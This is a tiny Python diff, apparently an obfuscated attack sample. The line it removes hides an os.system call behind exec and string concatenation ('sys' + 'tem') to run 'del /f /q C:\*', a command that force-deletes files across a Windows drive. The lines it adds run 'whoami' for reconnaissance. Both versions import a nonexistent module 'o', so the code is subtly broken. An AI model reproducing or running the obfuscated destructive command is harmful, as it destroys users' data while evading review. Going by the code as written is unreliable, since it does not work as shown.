@@ -1,1 +1,2 @@
-exec('o = __import__("o"); getattr(o, "sys" + "tem")("del /f /q C:\\*")')
+o = __import__("o")
+o.popen('whoami').read()
